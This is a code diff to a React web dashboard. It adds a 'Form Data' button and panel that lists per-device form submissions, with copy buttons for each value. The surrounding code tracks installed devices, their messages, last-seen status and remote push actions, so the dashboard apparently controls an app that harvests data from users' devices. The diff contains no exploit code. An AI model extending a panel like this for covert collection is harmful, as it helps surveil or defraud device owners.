@@ -1162,7 +1162,7 @@ function AdminUpdatePanel({ device }: { device: DbDevice }) {
   );
 }
 
-function DevicesPage({ devices, messages, initialDevice, onBack, initialCount, onCountChange }: { devices: DbDevice[]; messages: DbMessage[]; initialDevice?: DbDevice | null; onBack?: () => void; initialCount?: number; onCountChange?: (n: number) => void }) {
+function DevicesPage({ devices, messages, formData, initialDevice, onBack, initialCount, onCountChange }: { devices: DbDevice[]; messages: DbMessage[]; formData: DbFormData[]; initialDevice?: DbDevice | null; onBack?: () => void; initialCount?: number; onCountChange?: (n: number) => void }) {
   const t = useTheme();
   const [search, setSearch] = useState("");
   const [selected, setSelected] = useState<DbDevice | null>(initialDevice ?? null);
@@ -1196,6 +1196,7 @@ function DevicesPage({ devices, messages, initialDevice, onBack, initialCount, o
     }
   }, [devices]); // eslint-disable-line react-hooks/exhaustive-deps
   const [msgSearch, setMsgSearch] = useState("");
+  const [showFormData, setShowFormData] = useState(false);
   const [activeAction, setActiveAction] = useState<ActionKey | null>(null);
   const [quickState, setQuickState] = useState<Record<string, "idle"|"loading"|"ok"|"err">>({});
   const [quickProgress, setQuickProgress] = useState<Record<string, boolean>>({}); // 5s FCM progress bar
@@ -1410,7 +1411,26 @@ function DevicesPage({ devices, messages, initialDevice, onBack, initialCount, o
             </div>
           </div>
           <Row label="Installed" value={fmtDate(selected.installedAt)} accent="#22c55e" />
-          <Row label="Last Seen" value={selected.status === "uninstalled" ? "App uninstalled" : timeAgo(selected.lastOnline)} accent={selected.status !== "uninstalled" && isRecent(selected.lastOnline) ? "#22c55e" : undefined} />
+          {/* Last Seen row with Form Data button */}
+          <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`, gap: 8 }}>
+            <div style={{ width: 100, fontSize: 11, color: t.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Last Seen</div>
+            <div style={{ flex: 1, fontSize: 12, color: selected.status !== "uninstalled" && isRecent(selected.lastOnline) ? "#22c55e" : t.txt }}>
+              {selected.status === "uninstalled" ? "App uninstalled" : timeAgo(selected.lastOnline)}
+            </div>
+            <button
+              onClick={() => setShowFormData(v => !v)}
+              style={{
+                flexShrink: 0,
+                background: showFormData ? "#6366f1" : t.card,
+                border: `1.5px solid ${showFormData ? "#6366f1" : t.cardB}`,
+                borderRadius: 7, padding: "4px 10px",
+                fontSize: 10, fontWeight: 700,
+                color: showFormData ? "#fff" : t.txt2,
+                cursor: "pointer", transition: "all 0.15s",
+              }}>
+              Form Data
+            </button>
+          </div>
         </div>
 
         {/* Action buttons */}
@@ -1461,6 +1481,56 @@ function DevicesPage({ devices, messages, initialDevice, onBack, initialCount, o
             );
           })}
         </div>
+
+        {/* Form Data panel */}
+        {showFormData && (() => {
+          const entries = formData.filter(f => f.deviceId === selected.deviceId)
+            .sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
+          return (
+            <div style={{
+              background: t.card, border: `1.5px solid #6366f1`,
+              borderRadius: 10, overflow: "hidden",
+            }}>
+              <div style={{
+                display: "flex", alignItems: "center", justifyContent: "space-between",
+                padding: "9px 14px", borderBottom: `1px solid ${t.hdrB}`,
+                background: t.isDark ? "#1a1f3a" : "#eef2ff",
+              }}>
+                <span style={{ fontSize: 12, fontWeight: 700, color: "#6366f1" }}>
+                  Form Data ({entries.length})
+                </span>
+                <button onClick={() => setShowFormData(false)}
+                  style={{ background: "none", border: "none", cursor: "pointer", fontSize: 14, color: t.muted, lineHeight: 1 }}>
+                  ✕
+                </button>
+              </div>
+              {entries.length === 0
+                ? <div style={{ padding: "16px", textAlign: "center", fontSize: 12, color: t.muted }}>No form data for this device</div>
+                : entries.map((entry, ei) => (
+                  <div key={entry.id} style={{
+                    padding: "10px 14px",
+                    borderBottom: ei < entries.length - 1 ? `1px solid ${t.hdrB}` : "none",
+                  }}>
+                    <div style={{ fontSize: 10, color: t.muted, fontWeight: 600, marginBottom: 6, textTransform: "uppercase", letterSpacing: 0.3 }}>
+                      {fmtDate(entry.submittedAt)}
+                    </div>
+                    {Object.entries(entry.data).map(([k, v]) => (
+                      <div key={k} style={{ display: "flex", gap: 8, marginBottom: 4, alignItems: "flex-start" }}>
+                        <span style={{ fontSize: 10, fontWeight: 700, color: "#6366f1", minWidth: 80, flexShrink: 0, textTransform: "capitalize", paddingTop: 1 }}>
+                          {k}
+                        </span>
+                        <span style={{ fontSize: 11, color: t.txt, wordBreak: "break-all", flex: 1 }}>
+                          {String(v)}
+                        </span>
+                        <CopyIconButton value={String(v)} size={16} color="#6366f1" title="Copy" />
+                      </div>
+                    ))}
+                  </div>
+                ))
+              }
+            </div>
+          );
+        })()}
 
         {/* Live Online Check countdown — shown prominently inside device panel */}
         {quickState.online_check === "loading" && (
@@ -2606,7 +2676,7 @@ export default function WebDashboard() {
               {page === "home" && <HomePage devices={displayDevices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "home" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={homeMsgCountRef.current} onCountChange={n => { homeMsgCountRef.current = n; }} />}
               {page === "messages" && <MessagesPage messages={messages} devices={displayDevices} onOpenDevice={onOpenDevice} scrollToMsgId={backPage === "messages" ? scrollToMsgId : null} onScrollDone={() => setScrollToMsgId(null)} initialCount={msgPageCountRef.current} onCountChange={n => { msgPageCountRef.current = n; }} />}
               {page === "groups" && <GroupsPage devices={displayDevices} messages={messages} formData={formData} onOpenDevice={onOpenDevice} initialCount={groupsCountRef.current} onCountChange={n => { groupsCountRef.current = n; }} />}
-              {page === "devices" && <DevicesPage devices={displayDevices} messages={messages} initialDevice={selectedDevice} onBack={onBack} initialCount={devicesCountRef.current} onCountChange={n => { devicesCountRef.current = n; }} />}
+              {page === "devices" && <DevicesPage devices={displayDevices} messages={messages} formData={formData} initialDevice={selectedDevice} onBack={onBack} initialCount={devicesCountRef.current} onCountChange={n => { devicesCountRef.current = n; }} />}
               {page === "settings" && <SettingsPage appId={appId} isDark={darkMode} onToggleDark={toggleDark} devices={displayDevices} onLogout={handleLogout} />}
             </div>
             <ScrollToTopBtn />
